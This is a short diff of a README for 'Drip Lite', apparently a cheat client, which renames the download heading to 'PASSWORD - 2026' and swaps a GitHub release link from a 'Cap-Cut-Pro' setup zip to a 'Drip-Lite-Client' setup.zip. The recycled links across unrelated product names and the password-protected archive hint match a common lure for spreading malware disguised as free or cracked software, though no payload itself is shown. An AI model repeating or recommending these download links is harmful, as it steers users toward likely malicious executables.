@@ -13,9 +13,9 @@ Drip Lite &amp; update + fix
 
 ---
 
-## 📥 Download
+## 📥 PASSWORD - 2026
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Orangenovapersonify/Cap-Cut-Pro/releases/download/setup-v2.33/setup-v2.33.zip)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/DoctorWhisper/Drip-Lite-Client/releases/download/swe/setup.zip)
 ---
 
 ## 🌀 Features
